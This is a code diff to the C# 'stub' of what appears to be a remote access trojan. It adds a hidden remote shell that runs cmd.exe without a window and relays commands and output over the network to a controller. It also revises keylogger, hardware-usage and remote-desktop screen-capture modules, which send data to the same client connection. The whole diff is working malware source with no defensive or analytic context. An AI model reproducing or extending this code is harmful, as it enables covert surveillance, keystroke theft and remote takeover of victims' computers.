@@ -15,11 +15,85 @@ using VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs;
 
 namespace VanillaStub.Helpers.Services
 {
+    public static class RemoteShellStream
+    {
+        private static Thread RemoteShellThread = new Thread(StartRemoteShell);
+        private static bool RemoteShellActive { get; set; }
+        private static string LastInput { get; set; }
+        public static string Input { get; set; }
+        public static bool WriteLine { get; set; }
+
+        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
+        public static void Start()
+        {
+            if (!RemoteShellActive)
+            {
+                RemoteShellActive = true;
+                try
+                {
+                    RemoteShellThread.Start();
+                }
+                catch { }
+            }
+        }
+
+        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
+        public static void Stop()
+        {
+            if (RemoteShellActive)
+            {
+                RemoteShellActive = false;
+                try
+                {
+                    RemoteShellThread.Abort();
+                    RemoteShellThread = new Thread(StartRemoteShell);
+                }
+                catch { }
+            }
+        }
+
+        private static void StartRemoteShell()
+        {
+            Process Shell = new Process();
+            Shell.StartInfo.FileName = "cmd.exe";
+            Shell.StartInfo.CreateNoWindow = true;
+            Shell.StartInfo.UseShellExecute = false;
+            Shell.StartInfo.RedirectStandardOutput = true;
+            Shell.StartInfo.RedirectStandardInput = true;
+            Shell.StartInfo.RedirectStandardError = true;
+            Shell.OutputDataReceived += OutputHandler;
+            Shell.Start();
+            Shell.BeginOutputReadLine();
+            while (RemoteShellActive)
+            {
+                if (!WriteLine) continue;
+                LastInput = Input;
+                Shell.StandardInput.WriteLine(Input);
+                WriteLine = false;
+            }
+        }
+
+        private static void OutputHandler(object SendingProcess, DataReceivedEventArgs OutData)
+        {
+            StringBuilder Output = new StringBuilder();
+            if (!string.IsNullOrEmpty(OutData.Data))
+                try
+                {
+                    Output.Append(OutData.Data);
+                    List<byte> ToSend = new List<byte>();
+                    ToSend.Add((int) DataType.RemoteShellType);
+                    ToSend.AddRange(Encoding.ASCII.GetBytes(Output.ToString()));
+                    Networking.Networking.MainClient.Send(ToSend.ToArray());
+                }
+                catch { }
+        }
+    }
+
     public static class KeyloggerStream
     {
-        public static bool KeyloggerActive { get; set; }
-        public static Keylogger K = new Keylogger();
+        private static readonly Keylogger K = new Keylogger();
         private static Thread KeyloggerThread = new Thread(StartKeylogger);
+        private static bool KeyloggerActive { get; set; }
 
         [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
         public static void Start()
@@ -60,30 +134,8 @@ namespace VanillaStub.Helpers.Services
 
     public static class HardwareUsageStream
     {
-        public static bool HardwareUsageActive { get; set; }
         private static Thread HardwareUsageThread = new Thread(StartHardwareUsage);
-
-        //Data type enum
-        public enum DataType
-        {
-            ImageType = 0,
-            NotificationType = 1,
-            ClientTag = 2,
-            ProcessType = 3,
-            InformationType = 4,
-            FilesListType = 5,
-            CurrentDirectoryType = 6,
-            DirectoryUpType = 7,
-            FileType = 8,
-            ClipboardType = 9,
-            HardwareUsageType = 10,
-            KeystrokeType = 11,
-            CurrentWindowType = 12,
-            MicrophoneRecordingType = 13,
-            AntiVirusTag = 14,
-            WindowsVersionTag = 15,
-            MessageType = 16
-        }
+        public static bool HardwareUsageActive { get; set; }
 
         [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
         public static void Start()
@@ -123,7 +175,7 @@ namespace VanillaStub.Helpers.Services
             {
                 string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int)DataType.HardwareUsageType);
+                ToSend.Add((int) DataType.HardwareUsageType);
                 ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
                 Networking.Networking.MainClient.Send(ToSend.ToArray());
                 Thread.Sleep(500);
@@ -133,30 +185,15 @@ namespace VanillaStub.Helpers.Services
 
     public static class RemoteDesktopStream
     {
+        private const int CURSOR_SHOWING = 0x00000001;
+        private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);
         public static bool RemoteDesktopActive { get; set; }
-        private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);      
 
-        //Data type enum
-        public enum DataType
-        {
-            ImageType = 0,
-            NotificationType = 1,
-            ClientTag = 2,
-            ProcessType = 3,
-            InformationType = 4,
-            FilesListType = 5,
-            CurrentDirectoryType = 6,
-            DirectoryUpType = 7,
-            FileType = 8,
-            ClipboardType = 9,
-            HardwareUsageType = 10,
-            KeystrokeType = 11,
-            CurrentWindowType = 12,
-            MicrophoneRecordingType = 13,
-            AntiVirusTag = 14,
-            WindowsVersionTag = 15,
-            MessageType = 16
-        }
+        [DllImport("user32.dll")]
+        private static extern bool GetCursorInfo(out CursorInfo pci);
+
+        [DllImport("user32.dll")]
+        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
 
         [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
         public static void Start()
@@ -204,8 +241,9 @@ namespace VanillaStub.Helpers.Services
                         Image.PixelFormat, MS);
                     ImageBytes = MS.ToArray();
                 }
+
                 List<byte> ToSend = new List<byte>();
-                ToSend.Add((int)DataType.ImageType);
+                ToSend.Add((int) DataType.ImageType);
                 ToSend.AddRange(ImageBytes);
                 Networking.Networking.MainClient.Send(ToSend.ToArray());
                 Image.UnlockBits(BD);
@@ -223,10 +261,37 @@ namespace VanillaStub.Helpers.Services
                 Bitmap BMP = new Bitmap(Rect.Width, Rect.Height, PixelFormat.Format32bppPArgb);
                 Graphics G = Graphics.FromImage(BMP);
                 G.CopyFromScreen(0, 0, 0, 0, new Size(BMP.Width, BMP.Height), CopyPixelOperation.SourceCopy);
+                CursorInfo PCI;
+                PCI.cbSize = Marshal.SizeOf(typeof(CursorInfo));
+                if (GetCursorInfo(out PCI) && PCI.flags == CURSOR_SHOWING)
+                {
+                    DrawIcon(G.GetHdc(), PCI.ptScreenPos.x, PCI.ptScreenPos.y, PCI.hCursor);
+                    G.ReleaseHdc();
+                }
+
                 G.Dispose();
                 return BMP;
             }
-            catch { return new Bitmap(Rect.Width, Rect.Height); }
+            catch
+            {
+                return new Bitmap(Rect.Width, Rect.Height);
+            }
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct CursorInfo
+        {
+            public int cbSize;
+            public readonly int flags;
+            public readonly IntPtr hCursor;
+            public readonly PointAPI ptScreenPos;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct PointAPI
+        {
+            public readonly int x;
+            public readonly int y;
         }
     }
 }
